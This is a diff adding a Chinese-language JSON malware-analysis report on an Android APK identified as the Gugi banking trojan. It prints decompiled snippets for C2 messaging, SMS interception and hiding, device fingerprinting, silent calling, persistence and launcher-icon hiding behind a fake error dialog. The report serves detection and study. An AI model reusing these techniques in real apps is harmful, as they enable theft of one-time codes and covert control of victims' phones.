@@ -1,0 +1,244 @@
+{
+  "APK信息": {
+    "文件名": "21464b5f8429991026e3c0ab59c24d9a314619fb1d1cb5c9f7bb2ba8be8f93e2.apk",
+    "sha256": "21464b5f8429991026e3c0ab59c24d9a314619fb1d1cb5c9f7bb2ba8be8f93e2",
+    "包名": "ru.drink.lime",
+    "应用名": "System",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 993.5
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "heartbeat",
+          "poll",
+          "report"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "La\\a\\b\\af;",
+          "method_signature": "while(true)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "private void j() {\n    this.d = true;\n    a(\"connect\", new Object[0]);\n    k();\n}\nprivate void k() {\n    while (true) {\n        List list = (List) this.j.poll();\n        if (list == null) { break; }\n        else { super.a((String) list.get(0), list.toArray()); }\n    }\n    this.j.clear();\n    while (true) {\n        a.a.h.c cVar = (a.a.h.c) this.k.poll();\n        if (cVar == null) {",
+          "malicious_code_snippet_context": "          a(new a.a.h.c(0));\n      }\n  \n>>>     private void j() {\n>>>         this.d = true;\n>>>         a(\"connect\", new Object[0]);\n>>>         k();\n>>>     }\n>>> \n>>>     private void k() {\n>>>         while (true) {\n>>>             List list = (List) this.j.poll();\n>>>             if (list == null) {\n>>>                 break;\n>>>             } else {\n>>>                 super.a((String) list.get(0), list.toArray());\n>>>             }\n>>>         }\n          this.j.clear();\n          while (true) {\n              a.a.h.c cVar = (a.a.h.c) this.k.poll();",
+          "behavior_description": "该代码是Gugi银行木马WebSocket C2通信模块的连接建立与消息队列刷新逻辑。方法j()在连接建立后将连接标志置为true，向远程服务器发送connect事件并调用k()；k()循环从待发送队列this.j和this.k中poll()取出断线期间缓存的事件/指令数据，通过super.a(事件名, 参数)经WebSocket通道发送到C2服务器，实现与C2的实时命令通道建立及缓存数据回传。数据流向：本地缓存消息队列（窃取数据/待上报事件）→ WebSocket事件发送至远程C2服务器。 [未经交叉验证]",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\SmsReceiver;",
+          "method_signature": "if(new ru.drink.lime.a.d(context)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\nString originatingAddress = smsMessageArr[i].getOriginatingAddress();\nstr = str + smsMessageArr[i].getMessageBody();\nif (new ru.drink.lime.a.d(context).e(str2)) {\n    abortBroadcast();\n}\nnew ru.drink.lime.a.b(context).a(new ru.drink.lime.b.c(str, str2, 0, context));",
+          "malicious_code_snippet_context": "              if (Build.VERSION.SDK_INT >= 23) {\n                  smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i], extras.getString(\"format\"));\n              } else {\n>>>                 smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>             }\n>>>             String originatingAddress = smsMessageArr[i].getOriginatingAddress();\n>>>             str = str + smsMessageArr[i].getMessageBody();\n>>>             i++;\n>>>             str2 = originatingAddress;\n>>>         }\n          if (new ru.drink.lime.a.d(context).e(str2)) {\n              ru.drink.lime.c.a.c(\"abortBroadcast!\");\n              abortBroadcast();",
+          "behavior_description": "该代码位于短信广播接收器(SmsReceiver)中，通过SmsMessage.createFromPdu()解析收到的短信PDU数据，提取发件人号码和短信内容；随后调用ru.drink.lime.a.d(context).e(发件人号码)判断该号码是否匹配恶意过滤规则（通常为C2下发的拦截号码列表，如银行/验证码短信号码），若匹配则调用abortBroadcast()终止广播，使短信对用户及其他应用完全不可见（隐蔽拦截）；最后将拦截到的短信内容和发件人号码封装为ru.drink.lime.b.c对象传递给ru.drink.lime.a.b处理（上报C2服务器或解析指令）。数据流向：系统短信广播PDU数据→解析发件人与内容→abortBroadcast()隐藏短信+转发至恶意处理模块，属于Gugi银行木马窃取短信验证码(OTP)的典型行为，可直接造成用户资金损失和隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\SocketService;",
+          "method_signature": "d()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String deviceId = telephonyManager.getDeviceId();\nString simOperatorName = telephonyManager.getSimOperatorName();\nString line1Number = telephonyManager.getLine1Number();\nString simCountryIso = telephonyManager.getSimCountryIso();\nString networkOperator = telephonyManager.getNetworkOperator();\njSONObject.put(\"imei\", deviceId);\njSONObject.put(\"client_version\", \"1.5\");\njSONObject.put(\"client_sdk_version\", Build.VERSION.RELEASE);",
+          "malicious_code_snippet_context": "          TelephonyManager telephonyManager = (TelephonyManager) getSystemService(\"phone\");\n          JSONObject jSONObject = new JSONObject();\n          try {\n>>>             String deviceId = telephonyManager.getDeviceId();\n>>>             String str = Build.VERSION.RELEASE;\n>>>             String simOperatorName = telephonyManager.getSimOperatorName();\n>>>             String line1Number = telephonyManager.getLine1Number();\n>>>             String simCountryIso = telephonyManager.getSimCountryIso();\n>>>             String networkOperator = telephonyManager.getNetworkOperator();\n>>>             int i = Integer.parseInt(networkOperator.substring(0, 3));\n>>>             ru.drink.lime.c.a.b(\"registration() :: clientSdkVersion: \" + str);\n              jSONObject.put(\"imei\", deviceId);\n              jSONObject.put(\"client_version\", \"1.5\");\n              jSONObject.put(\"client_sdk_version\", str);",
+          "behavior_description": "该代码位于Gugi银行木马（Trojan-Banker.AndroidOS.Gugi）的SocketService中，是木马与C2服务器建立WebSocket连接后的设备注册流程（日志显示registration()）。代码通过TelephonyManager批量采集设备指纹：IMEI（getDeviceId）、SIM运营商名称、本机手机号（getLine1Number）、SIM国家码、网络运营商MCC/MNC及系统版本，全部封装进JSONObject并附带客户端版本号，用于向C2服务器注册受感染设备、建立设备唯一标识，以便攻击者后续远程追踪、下发指令（如短信劫持、钓鱼覆盖攻击）。数据流向：TelephonyManager.getDeviceId()/getLine1Number()/getSimOperatorName()/getSimCountryIso()/getNetworkOperator() → JSONObject字段封装（imei等）→ 经WebSocket上报C2服务器完成僵尸设备注册。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "banking_trojan",
+      "中文名": "银行木马",
+      "MITRE": "T1418",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "credential_phishing",
+          "中文名": "凭证钓鱼",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "password"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\bi;",
+          "method_signature": "a(Object... objArr)",
+          "malicious_behavior": "banking_trojan",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "JSONObject jSONObject = (JSONObject) objArr[0];\nthis.f705a.l = jSONObject.optInt(\"has_contacts\");\nthis.f705a.b(jSONObject.optInt(\"id\"), jSONObject.optString(\"password\"));",
+          "malicious_code_snippet_context": "      @Override // a.a.c.b\n      public void a(Object... objArr) {\n          ru.drink.lime.c.a.a(\"Socket: onRegister\");\n>>>         JSONObject jSONObject = (JSONObject) objArr[0];\n>>>         this.f705a.l = jSONObject.optInt(\"has_contacts\");\n>>>         this.f705a.b(jSONObject.optInt(\"id\"), jSONObject.optString(\"password\"));\n      }\n  }",
+          "behavior_description": "该代码是Gugi银行木马WebSocket C2通信链路的onRegister回调。木马通过WebSocket连接C2服务器完成上线注册后，C2下发JSON响应，代码解析其中的id和password字段并调用this.f705a.b(id, password)将其保存为该僵尸节点的会话认证凭证，同时读取has_contacts标志（指示后续是否窃取用户通讯录）。数据流向：C2服务器WebSocket推送的JSON注册响应→解析id/password/has_contacts→保存为木马与C2的持久会话凭证，使设备沦为受控僵尸节点，为后续接收凭证钓鱼（overlay钓鱼界面）、短信窃取、通讯录上传等指令建立命令通道，属于银行木马C2远程控制基础设施的核心组成部分。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\AdminService;",
+          "method_signature": "if(this.g == null)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public int onStartCommand(Intent intent, int i, int i2) {\n    if (this.g == null) {\n        a();\n    }\n    startForeground(1, Build.VERSION.SDK_INT < 16 ? builder.getNotification() : builder.build());\n    return 1;\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i, int i2) {\n>>>         if (b()) {\n>>>             stopSelf();\n>>>             return 2;\n>>>         }\n>>>         if (this.g == null) {\n>>>             a();\n          }\n          Notification.Builder builder = new Notification.Builder(this.e);\n          builder.setContentIntent(null).setSmallIcon(R.drawable.ic_stat_action_info).setLargeIcon(BitmapFactory.decodeResource(this.e.getResources(), R.drawable.ic_stat_action_info)).setTicker(getResources().getText(R.string.admin_notify_title)).setContentTitle(getResources().getText(R.string.admin_notify_title)).setOngoing(false).setWhen(System.currentTimeMillis()).setSound(null).setVibrate(null).setContentText(getResources().getText(R.string.admin_notify_body));",
+          "behavior_description": "该代码属于 Gugi 银行木马（Trojan-Banker.AndroidOS.Gugi，包名 ru.drink.lime）的核心服务 AdminService。在 onStartCommand 回调中：当 this.g 为空时调用混淆方法 a()（结合厂商报告，Gugi 通过 WebSocket 与 C2 服务器实时通信，a() 推测为初始化/恢复 C2 连接）；随后构造一条伪装成系统管理类通知的 Notification 并调用 startForeground() 将自身提升为前台服务，使进程获得高优先级而难以被系统回收；最后返回 START_STICKY(1)，确保服务被杀死后系统自动重启。数据流向：系统服务启动/重启回调(onStartCommand) → 初始化 C2 WebSocket 连接(a()) → startForeground() 前台保活，实现木马长期驻留设备并持续维持与 C2 的实时命令通道，为后续短信拦截、钓鱼覆盖层等银行欺诈行为提供持久化保障。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\aw;",
+          "method_signature": "a(Object... objArr)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "JSONObject jSONObject = (JSONObject) objArr[0];\nint iOptInt = jSONObject.optInt(\"id\");\nIntent intent = new Intent(\"android.intent.action.CALL\", ru.drink.lime.c.b.a(jSONObject.optString(\"phone\")));\nintent.addFlags(268435456);\nthis.f674a.startActivity(intent);",
+          "malicious_code_snippet_context": "      @Override // a.a.c.b\n      public void a(Object... objArr) {\n          ru.drink.lime.c.a.a(\"Socket: make_ussd\");\n>>>         JSONObject jSONObject = (JSONObject) objArr[0];\n>>>         int iOptInt = jSONObject.optInt(\"id\");\n>>>         Intent intent = new Intent(\"android.intent.action.CALL\", ru.drink.lime.c.b.a(jSONObject.optString(\"phone\")));\n>>>         intent.addFlags(268435456);\n>>>         try {\n              this.f674a.startActivity(intent);\n              new ru.drink.lime.a.c(this.f674a.h).a(new ru.drink.lime.b.f(8, iOptInt + \"-1\"));\n          } catch (Exception e) {",
+          "behavior_description": "该代码是Gugi银行木马WebSocket命令分发器中的一个命令处理器（日志标识 Socket: make_ussd）。当C2服务器通过WebSocket下发命令时，代码从命令JSON对象中提取远程指定的 phone 字段（电话号码），构造 ACTION_CALL 意图并直接调用 startActivity() 发起拨号。ACTION_CALL 与 ACTION_DIAL 不同，它会直接拨出电话而无需用户在拨号界面确认，属于静默拨号操作。拨打完成后，代码将执行结果（成功返回 id-1，失败返回 id-0）通过回传通道上报给C2服务器，形成完整的远程控制闭环。数据流向：C2服务器WebSocket命令(JSON) → optString(\"phone\") 解析出号码 → 构造 ACTION_CALL Intent → startActivity() 静默拨号 → 结果回传C2。攻击者可利用此功能拨打高额付费号码或银行客服电话实施欺诈，直接造成用户话费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\drink\\lime\\MainActivity;",
+          "method_signature": "onCreate(Bundle bundle)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.f626c.setTitle(\"В процессе установки возникли ошибки\");\nthis.f626c.setMessage(\"Невозможно продолжить установку приложения из-за несовместимости версий.\");\nthis.f626c.setCancelable(false);\ngetPackageManager().setComponentEnabledSetting(new ComponentName(getPackageName(), getClass().getName()), 2, 1);",
+          "malicious_code_snippet_context": "          getWindow().setFlags(1024, 1024);\n          this.f625b = new AlertDialog.Builder(this);\n          this.f626c = this.f625b.create();\n>>>         this.f626c.setTitle(\"В процессе установки возникли ошибки\");\n>>>         this.f626c.setIcon(android.R.drawable.ic_dialog_info);\n>>>         this.f626c.setMessage(\"Невозможно продолжить установку приложения из-за несовместимости версий.\");\n>>>         this.f626c.setCancelable(false);\n          this.f626c.setButton(\"закрыть\", new x(this));\n          runOnUiThread(new y(this));\n          this.f624a = new ru.drink.lime.a.d(this);",
+          "behavior_description": "该代码位于 MainActivity.onCreate 中，是典型的银行木马（Gugi 家族）图标隐藏+社会工程欺骗组合行为。应用启动后：1) 弹出一个不可取消（setCancelable(false)）的伪造俄语错误对话框，谎称'安装过程中出现错误/版本不兼容无法继续安装'，诱骗用户以为应用安装失败而放弃追查；2) 实际上通过 getPackageManager().setComponentEnabledSetting() 将自身启动器组件（MainActivity）设置为禁用状态（参数2 = COMPONENT_ENABLED_STATE_DISABLED，参数1 = DONT_KILL_APP，禁用组件但不杀死进程），使应用图标从桌面启动器中消失。数据流向：getPackageName()/getClass().getName() 获取自身包名和主 Activity 类名 → 构造 ComponentName → setComponentEnabledSetting 禁用该组件 → 应用图标从启动器隐藏，木马在用户无感知的情况下隐蔽驻留，增加发现和卸载难度。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
